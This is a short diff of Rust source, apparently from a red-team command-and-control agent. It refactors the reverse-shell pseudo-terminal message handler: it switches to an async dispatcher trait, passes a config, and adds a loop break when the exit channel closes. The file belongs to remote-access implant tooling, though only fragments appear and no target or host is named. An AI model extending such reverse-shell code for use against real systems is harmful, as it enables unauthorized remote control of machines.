@@ -1,6 +1,9 @@
-use super::Dispatcher;
+use super::AsyncDispatcher;
 use anyhow::Result;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
+use pb::{
+    c2::{ReverseShellMessageKind, ReverseShellRequest},
+    config::Config,
+};
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 #[cfg(not(target_os = "windows"))]
 use std::path::Path;
@@ -17,8 +20,8 @@ pub struct ReverseShellPTYMessage {
     pub(crate) cmd: Option<String>,
 }
 
-impl Dispatcher for ReverseShellPTYMessage {
-    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
+impl AsyncDispatcher for ReverseShellPTYMessage {
+    async fn dispatch(self, transport: &mut impl Transport, _cfg: Config) -> Result<()> {
         let task_id = self.id;
 
         #[cfg(debug_assertions)]
@@ -116,6 +119,8 @@ impl Dispatcher for ReverseShellPTYMessage {
                         Err(TryRecvError::Disconnected) => {
                             #[cfg(debug_assertions)]
                             log::info!("closing output stream, exit channel closed");
+
+                            break;
                         }
                     }
 
